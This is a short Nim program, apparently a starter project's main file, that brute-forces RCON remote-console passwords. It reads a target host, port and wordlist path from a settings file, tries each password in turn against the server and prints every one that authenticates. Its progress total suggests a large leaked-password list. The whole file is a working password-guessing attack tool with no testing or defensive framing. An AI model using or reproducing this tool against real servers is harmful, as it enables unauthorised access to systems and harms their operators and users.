# This is just an example to get you started. A typical binary package
# uses this file as the main entry point of the application.
import json
import nimrcon
import progress

type
  Settings = object
    target: string
    port: int
    password_list: string

var correctGuesses = newSeq[string]()

when isMainModule:
  var bar = newProgressBar(total = 14344385)
  bar.start()
  let setting = to(parseJson(readFile("settings.json")), Settings)
  for password in lines(setting.password_list):
    try:
      discard newRCONConnection(setting.target, setting.port, password)
      correctGuesses.add(password)
      bar.increment()
    except AuthError:
      bar.increment()
  bar.finish()
  echo "Found passwords"
  echo correctGuesses
